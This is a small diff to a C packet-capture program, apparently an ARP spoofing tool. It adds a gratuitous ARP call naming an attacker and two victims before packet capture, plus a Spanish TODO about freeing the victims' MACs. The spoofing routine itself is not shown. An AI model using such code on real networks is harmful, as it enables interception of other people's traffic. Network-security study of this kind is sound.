@@ -59,11 +59,15 @@ int main(int argc,char *argv[]){
 	construct_targets(l,argc,argv);
 
 	/* loop to capture packets */
+
+    ARP_gratuitous_request(ip_attacker, mac_attacker, ip_victim1, ip_victim2, mac_victim2, l);
 	u_char *my_arguments=NULL;
 	pcap_loop(handle, total_packet_count, my_packet_handler, my_arguments);
 
 	/* free devices */
 	pcap_freealldevs(alldevs);
+
+    // TODO: liberar MACs de las víctimas alojadas como *
 
 	return 0;
 }
